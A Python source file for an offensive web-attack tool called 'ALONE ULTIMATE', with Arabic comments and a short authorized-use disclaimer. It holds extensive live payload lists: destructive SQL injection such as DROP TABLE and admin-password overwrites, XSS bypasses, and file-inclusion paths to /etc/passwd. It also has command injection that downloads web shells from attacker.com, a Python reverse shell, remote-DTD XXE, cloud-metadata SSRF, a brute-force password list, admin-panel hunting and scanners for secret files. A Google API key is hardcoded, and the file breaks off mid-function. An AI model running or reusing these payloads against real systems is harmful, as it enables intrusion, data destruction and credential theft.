import requests
import json
import re
from datetime import datetime
import time
import random
from urllib.parse import urljoin, urlparse, parse_qs, quote
import sys
import hashlib
import socket
import dns.resolver
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
from bs4 import BeautifulSoup
import base64
import subprocess
import os

# تجاهل تحذيرات SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ALONE_Ultimate:
    """
    ALONE ULTIMATE - Advanced Penetration Testing Framework
    الإصدار: 5.0 - Black Shadow Elite 🥷
    """
    
    def __init__(self):
        self.API_KEY = "AIzaSyA1-OM7jBLz-wHCylwYhw8zeXhWMZOryEA"
        self.url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-flash-latest:generateContent?key={self.API_KEY}"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        # ==================== قواعد بيانات ضخمة للثغرات ====================
        
        # Payloads متقدمة لـ SQL Injection
        self.payloads = {
            'sqli': {
                'error_based': [
                    "'", '"', "1' AND '1'='1", "1' AND '1'='2",
                    "1' OR '1'='1'--", "1' OR '1'='1'/*", "' OR '1'='1'--",
                    "admin'--", "1' ORDER BY 1--", "1' ORDER BY 100--",
                    "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
                    "1' UNION SELECT NULL,NULL,NULL--", "1' AND SLEEP(5)--",
                    "1' AND BENCHMARK(5000000,MD5(1))--", "1' WAITFOR DELAY '0:0:5'--",
                    "'; EXEC xp_cmdshell('whoami')--", "'; DROP TABLE users--",
                    "' OR 1=1 INTO OUTFILE '/tmp/out.txt'--",
                    "' UNION SELECT 1,@@version,3--", "' UNION SELECT 1,user(),3--",
                    "' UNION SELECT 1,database(),3--", "1' AND 1=0 UNION SELECT 1,2,3--"
                ],
                'time_based': [
                    "1' AND SLEEP(5)--", "1' AND BENCHMARK(5000000,MD5(1))--",
                    "1' WAITFOR DELAY '0:0:5'--", "1' AND pg_sleep(5)--",
                    "1' OR SLEEP(5)--", "' OR SLEEP(5)='", "1' AND IF(1=1,SLEEP(5),0)--"
                ],
                'boolean_based': [
                    "1' AND '1'='1", "1' AND '1'='2",
                    "1' OR '1'='1", "1' OR '1'='2",
                    "' AND '1'='1", "' AND '1'='2"
                ],
                'stacked': [
                    "'; DROP TABLE users--", "'; INSERT INTO users VALUES('hacker','pass')--",
                    "'; UPDATE users SET password='hacked' WHERE username='admin'--",
                    "'; DELETE FROM users WHERE username='admin'--"
                ],
                'blind': [
                    "1' AND (SELECT * FROM users) = 1--",
                    "1' AND (SELECT COUNT(*) FROM users) > 0--",
                    "1' AND EXISTS(SELECT * FROM users)--"
                ]
            },
            
            'xss': {
                'reflected': [
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                    "<svg/onload=alert(1)>",
                    "<body onload=alert(1)>",
                    "<details open ontoggle=alert(1)>",
                    "<input onfocus=alert(1) autofocus>",
                    "<select onchange=alert(1)><option>1</option></select>",
                    "<textarea onfocus=alert(1) autofocus></textarea>",
                    "<keygen onfocus=alert(1) autofocus>",
                    "<video><source onerror=alert(1)>",
                    "<audio><source onerror=alert(1)>",
                    "javascript:alert(1)",
                    "\"-alert(1)-\"",
                    "'-alert(1)-'",
                    "';alert(1);//",
                    "\"><script>alert(1)</script>",
                    "<img src=\"javascript:alert(1)\">",
                    "<img src=x onerror=\"alert(String.fromCharCode(88,83,83))\">"
                ],
                'stored': [
                    "<script>alert(document.cookie)</script>",
                    "<img src=x onerror=alert(document.domain)>",
                    "<svg/onload=alert(document.location)>"
                ],
                'dom_based': [
                    "#<script>alert(1)</script>",
                    "#</script><script>alert(1)</script>",
                    "javascript:alert(1)//",
                    "\"-alert(document.cookie)-\""
                ],
                'bypass_filters': [
                    "<scr<script>ipt>alert(1)</scr</script>ipt>",
                    "<%3Cscript%3Ealert(1)%3C/script%3E>",
                    "&lt;script&gt;alert(1)&lt;/script&gt;",
                    "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>",
                    "<img src=x onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\">"
                ]
            },
            
            'lfi': {
                'linux': [
                    "../../../etc/passwd",
                    "../../../../etc/passwd",
                    "../../../../../etc/passwd",
                    "../../../../../../etc/passwd",
                    "....//....//....//etc/passwd",
                    "..;/..;/..;/etc/passwd",
                    "../../../etc/passwd%00",
                    "../../../etc/passwd%00.jpg",
                    "php://filter/convert.base64-encode/resource=index.php",
                    "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
                    "/etc/passwd",
                    "/proc/self/environ",
                    "/proc/self/cmdline",
                    "/var/log/apache2/access.log",
                    "/var/log/apache/access.log",
                    "/var/log/nginx/access.log",
                    "/var/log/httpd/access.log"
                ],
                'windows': [
                    "..\\..\\..\\windows\\win.ini",
                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "..\\..\\..\\boot.ini",
                    "..\\..\\..\\windows\\repair\\sam",
                    "..\\..\\..\\windows\\php.ini",
                    "..\\..\\..\\windows\\system32\\config\\AppEvent.Evt"
                ],
                'wrapper': [
                    "php://filter/convert.base64-encode/resource=",
                    "php://filter/string.rot13/resource=",
                    "php://filter/zlib.deflate/resource=",
                    "php://filter/convert.iconv.utf-8.utf-16/resource=",
                    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
                    "expect://id"
                ]
            },
            
            'rce': {
                'basic': [
                    "; ls",
                    "; ls -la",
                    "| ls",
                    "|| ls",
                    "& ls",
                    "&& ls",
                    "`ls`",
                    "$(ls)",
                    "; whoami",
                    "| whoami",
                    "; cat /etc/passwd",
                    "; id",
                    "; uname -a",
                    "; pwd"
                ],
                'advanced': [
                    "; echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
                    "; wget http://attacker.com/shell.php -O shell.php",
                    "; curl http://attacker.com/shell.php -o shell.php",
                    "; powershell -Command \"Invoke-WebRequest -Uri http://attacker.com/shell.aspx -OutFile shell.aspx\"",
                    "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
                ],
                'php': [
                    "system('id');",
                    "exec('whoami');",
                    "shell_exec('ls');",
                    "passthru('cat /etc/passwd');",
                    "`id`;",
                    "eval($_GET['cmd']);",
                    "assert($_POST['cmd']);",
                    "preg_replace('/.*/e', 'system(\"id\")', '');"
                ],
                'windows': [
                    "; dir",
                    "| dir",
                    "& dir",
                    "& whoami",
                    "; ipconfig",
                    "| net user",
                    "& systeminfo"
                ]
            },
            
            'idor': [
                "1", "2", "3", "100", "1000", "9999", "10000",
                "admin", "user", "root", "administrator", "guest",
                "profile", "account", "user_id", "id", "uid",
                "../1", "../2", "../../1",
                "-1", "0", "999999", "1111111",
                "true", "false", "null", "undefined"
            ],
            
            'ssrf': [
                "http://127.0.0.1:80",
                "http://127.0.0.1:443",
                "http://127.0.0.1:22",
                "http://127.0.0.1:3306",
                "http://127.0.0.1:5432",
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/",
                "http://localhost:8080",
                "http://localhost:5000",
                "file:///etc/passwd",
                "gopher://localhost:8080/_GET / HTTP/1.0",
                "dict://localhost:11211/",
                "ftp://localhost:21"
            ],
            
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;]><root/>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&test;</root>'
            ],
            
            'ssti': [
                "{{7*7}}",
                "${7*7}",
                "{{7*'7'}}",
                "<%= 7*7 %>",
                "${{7*7}}",
                "{{config}}",
                "{{self.__class__.__mro__}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}"
            ],
            
            'cors': [
                "Origin: https://evil.com",
                "Origin: null",
                "Origin: http://localhost"
            ],
            
            'csrf': [
                '<form action="http://target.com/vulnerable" method="POST"><input type="hidden" name="action" value="delete"/></form><script>document.forms[0].submit();</script>'
            ],
            
            'open_redirect': [
                "//evil.com",
                "https://evil.com",
                "http://evil.com",
                "////evil.com",
                "/\\evil.com",
                "javascript:alert(1)"
            ],
            
            'http_parameter_pollution': [
                "?param=value1&param=value2",
                "?param=value1%00value2",
                "?param[]=value1&param[]=value2"
            ]
        }
        
        # قائمة موسعة بمسارات لوحة التحكم
        self.admin_paths = [
            "admin", "administrator", "adm", "dashboard", "adminpanel",
            "cpanel", "wp-admin", "admin/login", "admin/index", "admin/dashboard",
            "adminpanel.php", "admin.php", "admin_area", "admin_area.php",
            "login/admin", "admin/login.php", "administrator/login",
            "backend", "controlpanel", "cp", "manager", "management",
            "siteadmin", "site_admin", "sysadmin", "system_admin",
            "webadmin", "web_admin", "panel", "control_panel",
            "admin/controlpanel", "admin/panel", "admin/management",
            "admin/backend", "admin/cp", "admin/administrator",
            "user/login", "users/login", "member/login", "members/login",
            "account/login", "accounts/login", "signin", "sign-in",
            "login", "log-in", "signin.php", "login.php", "logon",
            "auth", "authentication", "authenticate", "validate",
            "secure", "security", "secure/login", "security/login",
            "wp-login.php", "wp-admin.php", "wp-admin/admin.php",
            "joomla/administrator", "joomla/admin", "drupal/admin",
            "drupal/user/login", "moodle/admin", "moodle/login",
            "phpmyadmin", "phpMyAdmin", "pma", "myadmin",
            "mysql", "sql", "database", "dbadmin", "db_manager",
            "webmail", "email", "mail", "roundcube", "squirrelmail"
        ]
        
        # قائمة بكلمات المرور الشائعة موسعة
        self.common_passwords = [
            "admin", "password", "123456", "12345678", "1234", "12345",
            "admin123", "administrator", "root", "toor", "pass", "pass123",
            "password123", "admin@123", "Admin@123", "adminadmin",
            "letmein", "welcome", "login", "admin1", "administrator1",
            "P@ssw0rd", "admin123!", "Admin123!", "admin@1234",
            "admin1234", "123456789", "1234567890", "qwerty", "abc123",
            "football", "monkey", "dragon", "baseball", "iloveyou",
            "trustno1", "sunshine", "master", "shadow", "ashley",
            "bailey", "passw0rd", "shadow", "superman", "superuser",
            "Admin@123", "Admin123", "admin@123", "admin#123",
            "admin123#", "Administrator@123", "Root@123", "root123",
            "password1", "password12", "password123!", "Password123",
            "P@ssword", "P@55w0rd", "pa$$word", "Pa$$w0rd",
            "123456a", "123456b", "123456ab", "123456abc",
            "admin@12345", "Admin@12345", "administrator123",
            "admin!@#", "Admin!@#", "admin!@#$", "Admin!@#$"
        ]
        
        # قائمة بالامتدادات الحساسة
        self.sensitive_extensions = [
            '.bak', '.backup', '.old', '.new', '.tmp', '.temp',
            '.swp', '.swo', '.~', '.back', '.copy', '.orig',
            '.sql', '.dump', '.db', '.sqlite', '.mdb', '.accdb',
            '.conf', '.config', '.cfg', '.ini', '.env', '.yml',
            '.xml', '.json', '.txt', '.log', '.error', '.debug',
            '.key', '.pem', '.crt', '.cer', '.pfx', '.p12',
            '.git', '.svn', '.hg', '.idea', '.vscode',
            '.htaccess', '.htpasswd', '.bashrc', '.profile',
            'wp-config.php', 'config.php', 'database.php',
            'settings.php', 'configuration.php', '.env.local',
            '.env.production', '.env.development'
        ]
        
        # قائمة بالكلمات المفتاحية للثغرات
        self.vuln_keywords = {
            'sqli': [
                'sql', 'mysql', 'oracle', 'database error',
                'you have an error in your sql', 'warning: mysql',
                'unclosed quotation mark', 'odbc drivers',
                'division by zero', 'unknown column',
                'mysql_fetch', 'mysql_num_rows', 'mysql_query',
                'mysqli_fetch', 'mysqli_query', 'pg_query',
                'SQL syntax', 'MySQL server version',
                'Incorrect syntax near', 'Unclosed quotation mark',
                'Microsoft OLE DB', 'Microsoft JET Database',
                'PostgreSQL query failed', 'SQLite3::query'
            ],
            'xss': [
                '<script>', 'alert(', 'onerror=', 'onload=',
                'javascript:', 'eval(', 'document.cookie',
                'window.location', 'innerHTML', 'document.write'
            ],
            'lfi': [
                'root:x:', 'bin:x:', 'daemon:x:', 'adm:x:',
                'wp-config', 'database password', 'DB_PASSWORD',
                '[extensions]', 'for 16-bit app support',
                'HTTP_USER_AGENT', 'HTTP_REFERER'
            ],
            'rce': [
                'uid=', 'gid=', 'groups=', 'Warning: system()',
                'Warning: exec()', 'Warning: shell_exec()',
                'Warning: passthru()', 'Warning: popen()',
                'Warning: proc_open()'
            ]
        }
        
        # إحصائيات متقدمة
        self.stats = {
            'urls_crawled': 0,
            'vulnerabilities_found': 0,
            'admin_panels_found': 0,
            'credentials_cracked': 0,
            'scan_time': 0,
            'requests_sent': 0,
            'errors': 0
        }
        
        self.discovered_urls = []
        self.vulnerabilities = []
        self.scan_history = []
        self.admin_panels = []
        self.cracked_credentials = []
        self.forms = []
        self.js_files = []
        self.api_endpoints = []
        self.subdomains = []
        
    # ==================== دوال التلوين والواجهة ====================
    
    def c(self, text, color_code, bold=False):
        """تلوين النصوص"""
        colors = {
            'red': '\033[91m',
            'green': '\033[92m',
            'yellow': '\033[93m',
            'blue': '\033[94m',
            'purple': '\033[95m',
            'cyan': '\033[96m',
            'white': '\033[97m',
            'orange': '\033[38;5;208m',
            'pink': '\033[38;5;206m',
            'end': '\033[0m'
        }
        bold_code = '\033[1m' if bold else ''
        return f"{bold_code}{colors.get(color_code, '\033[97m')}{text}{colors['end']}"
    
    def print_banner(self):
        """شاشة بداية متطورة"""
        banner = f"""
{self.c('╔══════════════════════════════════════════════════════════════════════════════════╗', 'red')}
{self.c('║', 'red')}                                                                              {self.c('║', 'red')}
{self.c('║', 'red')}    {self.c('███████╗██╗     ███████╗██╗   ██╗████████╗██╗███╗   ███╗ █████╗ ████████╗███████╗', 'cyan')}    {self.c('║', 'red')}
{self.c('║', 'red')}    {self.c('██╔════╝██║     ██╔════╝██║   ██║╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝██╔════╝', 'cyan')}    {self.c('║', 'red')}
{self.c('║', 'red')}    {self.c('█████╗  ██║     █████╗  ██║   ██║   ██║   ██║██╔████╔██║███████║   ██║   █████╗  ', 'cyan')}    {self.c('║', 'red')}
{self.c('║', 'red')}    {self.c('██╔══╝  ██║     ██╔══╝  ██║   ██║   ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██╔══╝  ', 'cyan')}    {self.c('║', 'red')}
{self.c('║', 'red')}    {self.c('███████╗███████╗███████╗╚██████╔╝   ██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   ███████╗', 'cyan')}    {self.c('║', 'red')}
{self.c('║', 'red')}    {self.c('╚══════╝╚══════╝╚══════╝ ╚═════╝    ╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝', 'cyan')}    {self.c('║', 'red')}
{self.c('║', 'red')}                                                                              {self.c('║', 'red')}
{self.c('╠══════════════════════════════════════════════════════════════════════════════════╣', 'red')}
{self.c('║', 'red')}                     {self.c('🔥 ALONE ULTIMATE EDITION v5.0 - Black Shadow Elite', 'orange', True)}                     {self.c('║', 'red')}
{self.c('║', 'red')}                        {self.c('⚡ Advanced Penetration Testing Framework', 'purple')}                         {self.c('║', 'red')}
{self.c('║', 'red')}              {self.c('👑 The Most Powerful Egyptian Penetration Testing Tool', 'green')}               {self.c('║', 'red')}
{self.c('╠══════════════════════════════════════════════════════════════════════════════════╣', 'red')}
{self.c('║', 'red')}  {self.c('⚠️  DISCLAIMER: Use only on authorized targets! Illegal use is prohibited!', 'red', True)}  {self.c('║', 'red')}
{self.c('╚══════════════════════════════════════════════════════════════════════════════════╝', 'red')}
        """
        print(banner)
        time.sleep(2)
    
    def print_menu(self):
        """قائمة متقدمة"""
        menu = f"""
{self.c('┌─────────────────────────────────────────────────────────────────────────────────┐', 'blue')}
{self.c('│', 'blue')}                             {self.c('🎯 MAIN MENU', 'green', True)}                                      {self.c('│', 'blue')}
{self.c('├─────────────────────────────────────────────────────────────────────────────────┤', 'blue')}
{self.c('│', 'blue')}  {self.c('🛡️  BASIC SCANNING', 'yellow', True)}                                                         {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('[1]', 'yellow')} {self.c('🚀 FULL SCAN', 'cyan')}          - Complete website audit             {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('[2]', 'yellow')} {self.c('⚡ QUICK SCAN', 'cyan')}         - Fast vulnerability check           {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('[3]', 'yellow')} {self.c('🌐 ADVANCED CRAWLER', 'cyan')}   - Deep web spider                    {self.c('│', 'blue')}
{self.c('│', 'blue')}                                                                                                 {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('👑 ADMIN HUNTING', 'orange', True)}                                                         {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('[4]', 'yellow')} {self.c('🔍 ADMIN HUNTER', 'orange')}      - Find admin panels                  {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('[5]', 'yellow')} {self.c('💣 BRUTE FORCE', 'red')}         - Advanced brute force               {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('[6]', 'yellow')} {self.c('🔑 DEFAULT CREDS', 'cyan')}       - Test default credentials           {self.c('│', 'blue')}
{self.c('│', 'blue')}                                                                                                 {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('💉 VULNERABILITY SCANNING', 'red', True)}                                                 {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('[7]', 'yellow')} {self.c('🗄️  SQL INJECTION', 'cyan')}      - Advanced SQLi testing              {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('[8]', 'yellow')} {self.c('📜 XSS', 'cyan')}                - XSS vulnerability scanner          {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('[9]', 'yellow')} {self.c('📁 LFI/RFI', 'cyan')}            - File inclusion tests               {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('[10]', 'yellow')} {self.c('💻 RCE', 'cyan')}               - Remote code execution              {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('[11]', 'yellow')} {self.c('🔐 IDOR', 'cyan')}              - Insecure direct objects            {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('[12]', 'yellow')} {self.c('🌍 SSRF', 'cyan')}              - Server-side request forgery        {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('[13]', 'yellow')} {self.c('📄 XXE', 'cyan')}               - XML external entities              {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('[14]', 'yellow')} {self.c('🎨 SSTI', 'cyan')}              - Template injection                 {self.c('│', 'blue')}
{self.c('│', 'blue')}                                                                                                 {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('🔧 ADVANCED FEATURES', 'purple', True)}                                                  {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('[15]', 'yellow')} {self.c('🔬 SOURCE ANALYZER', 'pink')}    - Deep code analysis                 {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('[16]', 'yellow')} {self.c('🌍 SUBDOMAIN SCANNER', 'cyan')} - Find subdomains                   {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('[17]', 'yellow')} {self.c('📡 API SCANNER', 'cyan')}        - Detect API endpoints              {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('[18]', 'yellow')} {self.c('💾 SENSITIVE FILES', 'cyan')}    - Find backup files                 {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('[19]', 'yellow')} {self.c('🕸️  TECH DETECTION', 'cyan')}    - Detect technologies               {self.c('│', 'blue')}
{self.c('│', 'blue')}                                                                                                 {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('📊 REPORTING', 'green', True)}                                                           {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('[20]', 'yellow')} {self.c('📋 DETAILED REPORT', 'cyan')}    - Generate full report              {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('[21]', 'yellow')} {self.c('🤖 AI ANALYSIS', 'purple')}       - Ask AI about vulnerabilities      {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('[22]', 'yellow')} {self.c('📜 HISTORY', 'cyan')}            - View scan history                 {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('[23]', 'yellow')} {self.c('📊 STATS', 'cyan')}              - Show statistics                   {self.c('│', 'blue')}
{self.c('│', 'blue')}                                                                                                 {self.c('│', 'blue')}
{self.c('│', 'blue')}  {self.c('[0]', 'red')} {self.c('🚪 EXIT', 'red')}                    - Exit ALONE Ultimate                {self.c('│', 'blue')}
{self.c('└─────────────────────────────────────────────────────────────────────────────────┘', 'blue')}
        """
        print(menu)
    
    # ==================== دوال متقدمة للكشف ====================
    
    def advanced_crawler(self, url, depth=3, threads=10):
        """زاحف متقدم متعدد الخيوط"""
        self.print_message(f"\n[🌐] Starting advanced crawler on {url}", 'cyan', True)
        self.print_message(f"[⚡] Depth: {depth} | Threads: {threads}", 'yellow')
        
        discovered = set([url])
        to_visit = [url]
        visited = set()
        domain = urlparse(url).netloc
        
        # تنظيف الدومين من البورت
        if ':' in domain:
            domain = domain.split(':')[0]
        
        self.forms = []
        self.js_files = []
        self.api_endpoints = []
        
        for level in range(depth):
            if not to_visit:
                break
                
            self.print_message(f"\n[📡] Level {level+1}/{depth} - URLs to crawl: {len(to_visit)}", 'blue')
            
            # استخدام ThreadPoolExecutor للزحف المتوازي
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = []
                for _ in range(min(threads, len(to_visit))):
                    if to_visit:
                        current_url = to_visit.pop(0)
                        if current_url not in visited:
                            futures.append(executor.submit(self.crawl_url, current_url, domain))
                
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        new_urls, forms, js, apis = result
                        visited.update([result[0]])
                        discovered.update(new_urls)
                        to_visit.extend([u for u in new_urls if u not in visited])
                        self.forms.extend(forms)
                        self.js_files.extend(js)
                        self.api_endpoints.extend(apis)
                        
                        # تحديث الإحصائيات
                        self.stats['urls_crawled'] += 1
            
            # إزالة التكرارات
            to_visit = list(set(to_visit))
        
        self.discovered_urls = list(discovered)
        
        self.print_message(f"\n[✅] Crawling completed!", 'green', True)
        self.print_message(f"    📍 Total URLs: {len(self.discovered_urls)}", 'cyan')
        self.print_message(f"    📝 Forms found: {len(self.forms)}", 'cyan')
        self.print_message(f"    📜 JS files: {len(self.js_files)}", 'cyan')
        self.print_message(f"    🔌 API endpoints: {len(self.api_endpoints)}", 'cyan')
        
        return self.discovered_urls
    
    def crawl_url(self, url, domain):
        """زحف رابط واحد"""
        try:
            response = self.session.get(url, timeout=5, verify=False)
            self.stats['requests_sent'] += 1
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            new_urls = []
            forms = []
            js_files = []
            api_endpoints = []
            
            # استخراج الروابط
            for link in soup.find_all('a', href=True):
                href = link['href']
                full_url = self.normalize_url(url, href)
                if full_url and domain in full_url:
                    new_urls.append(full_url)
            
            # استخراج الفورم
            for form in soup.find_all('form'):
                form_data = self.extract_form_info(form, url)
                if form_data:
                    forms.append(form_data)
            
            # استخراج ملفات JavaScript
            for script in soup.find_all('script', src=True):
                src = script['src']
                full_url = self.normalize_url(url, src)
                if full_url:
                    js_files.append(full_url)
            
            # البحث عن API endpoints
            api_patterns = ['/api/', '/v1/', '/v2/', '/rest/', '/graphql', '/wp-json']
            for pattern in api_patterns:
                if pattern in url:
                    api_endpoints.append(url)
            
            return new_urls, forms, js_files, api_endpoints
            
        except Exception as e:
            self.stats['errors'] += 1
            return None
    
    def normalize_url(self, base, link):
        """تطبيع الروابط"""
        try:
            if link.startswith('http'):
                return link
            elif link.startswith('//'):
                return 'http:' + link
            elif link.startswith('/'):
                parsed = urlparse(base)
                return f"{parsed.scheme}://{parsed.netloc}{link}"
            elif link.startswith('#'):
                return None
            else:
                return urljoin(base, link)
        except:
            return None
    
    def extract_form_info(self, form, page_url):
        """استخراج معلومات الفورم"""
        try:
            action = form.get('action', '')
            method = form.get('method', 'get').upper()
            
            # بناء URL كامل للفورم
            if action:
                form_url = urljoin(page_url, action)
            else:
                form_url = page_url
            
            # استخراج الحقول
            inputs = []
            for inp in form.find_all('input'):
                input_info = {
                    'name': inp.get('name', ''),
                    'type': inp.get('type', 'text'),
                    'value': inp.get('value', '')
                }
                inputs.append(input_info)
            
            # استخراج حقول textarea
            for textarea in form.find_all('textarea'):
                input_info = {
                    'name': textarea.get('name', ''),
                    'type': 'textarea',
                    'value': textarea.get('value', '')
                }
                inputs.append(input_info)
            
            # استخراج حقول select
            for select in form.find_all('select'):
                input_info = {
                    'name': select.get('name', ''),
                    'type': 'select',
                    'value': ''
                }
                inputs.append(input_info)
            
            return {
                'url': form_url,
                'method': method,
                'inputs': inputs,
                'page_url': page_url
            }
            
        except:
            return None
    
    def subdomain_scanner(self, domain, wordlist=None):
        """فحص الساب دومينات"""
        self.print_message(f"\n[🌍] Scanning subdomains for {domain}", 'cyan', True)
        
        if not wordlist:
            # قائمة كلمات للساب دومينات
            wordlist = [
                'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp',
                'pop', 'ns1', 'webdisk', 'ns2', 'cpanel', 'whm',
                'autodiscover', 'autoconfig', 'm', 'imap', 'test',
                'ns', 'blog', 'pop3', 'dev', 'www2', 'admin',
                'forum', 'news', 'vpn', 'ns3', 'mail2', 'new',
                'mysql', 'old', 'lists', 'support', 'mobile',
                'mx', 'static', 'docs', 'beta', 'shop', 'sql',
                'secure', 'demo', 'cp', 'calendar', 'wiki',
                'web', 'media', 'email', 'images', 'img',
                'download', 'dns', 'piwik', 'stats', 'analytics',
                'git', 'jenkins', 'jira', 'confluence', 'wiki',
                'api', 'staging', 'test', 'stage', 'dev',
                'development', 'prod', 'production', 'qa'
            ]
        
        found_subdomains = []
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for sub in wordlist:
                futures.append(executor.submit(self.check_subdomain, sub, domain))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found_subdomains.append(result)
                    self.print_message(f"  ✅ Found: {result}", 'green')
        
        self.subdomains = found_subdomains
        self.print_message(f"\n[📊] Total subdomains found: {len(found_subdomains)}", 'cyan', True)
        return found_subdomains
    
    def check_subdomain(self, sub, domain):
        """فحص ساب دومين واحد"""
        try:
            full_domain = f"{sub}.{domain}"
            ip = socket.gethostbyname(full_domain)
            
            # محاولة الاتصال عبر HTTP
            for protocol in ['http', 'https']:
                try:
                    url = f"{protocol}://{full_domain}"
                    response = self.session.get(url, timeout=3, verify=False)
                    if response.status_code < 500:
                        return {
                            'subdomain': full_domain,
                            'ip': ip,
                            'url': url,
                            'status': response.status_code
                        }
                except:
                    pass
            
            return {
                'subdomain': full_domain,
                'ip': ip,
                'url': None,
                'status': 'No web server'
            }
            
        except:
            return None
    
    def sensitive_files_scanner(self, url):
        """البحث عن الملفات الحساسة"""
        self.print_message(f"\n[💾] Scanning for sensitive files on {url}", 'cyan', True)
        
        found_files = []
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # مسارات خاصة للـ WordPress
        wp_paths = [
            'wp-config.php', 'wp-config.php.bak', 'wp-config.old',
            'wp-content/debug.log', 'wp-content/uploads/',
            'wp-admin/install.php', 'wp-admin/upgrade.php',
            'wp-json/wp/v2/users/', 'wp-json/oembed/1.0/'
        ]
        
        # مسارات عامة
        common_paths = [
            '.git/config', '.env', '.env.local', '.env.production',
            'config.php', 'config.php.bak', 'database.php',
            'configuration.php', 'settings.php', 'config.inc.php',
            'phpinfo.php', 'info.php', 'test.php', 'php.ini',
            '.htaccess', '.htpasswd', 'web.config',
            'backup.sql', 'dump.sql', 'db.sql', 'database.sql',
            'backup.zip', 'backup.tar.gz', 'backup.rar',
            'robots.txt', 'sitemap.xml', 'crossdomain.xml',
            'phpmyadmin/', 'phpMyAdmin/', 'pma/', 'adminer.php'
        ]
        
        all_paths = common_paths + wp_paths
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for path in all_paths:
                test_url = urljoin(base_url, path)
                futures.append(executor.submit(self.check_sensitive_file, test_url))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found_files.append(result)
                    self.print_message(f"  ⚠️  Found: {result['url']} - {result['note']}", 'yellow')
        
        self.print_message(f"\n[📊] Sensitive files found: {len(found_files)}", 'cyan', True)
        return found_files
    
    def check_sensitive_file(self, url):
        """فحص ملف حساس واحد"""
        try:
            response = self.session.get(url, timeout=3, verify=False)
            self.stats['requests_sent'] += 1
            
            if response.status_code == 200:
                # تحقق من المحتوى
                if 'DB_PASSWORD' in response.text or 'mysql' in response.text.lower():
                    return {
                        'url': url,
                        'status': response.status_code,
                        'size': len(response.text),
                        'note': 'Contains sensitive data!'
                    }
                elif response.status_code == 200:
                    return {
                        'url': url,
                        'status': response.status_code,
                        'size': len(response.text),
                        'note': 'Accessible'
                    }
        except:
            pass
        return None
    
    def tech_detection(self, url):
        """كشف التقنيات المستخدمة"""
        self.print_message(f"\n[🕸️] Detecting technologies on {url}", 'cyan', True)
        
        techs = []
        
        try:
            response = self.session.get(url, timeout=10, verify=False)
            headers = response.headers
            server = headers.get('Server', '')
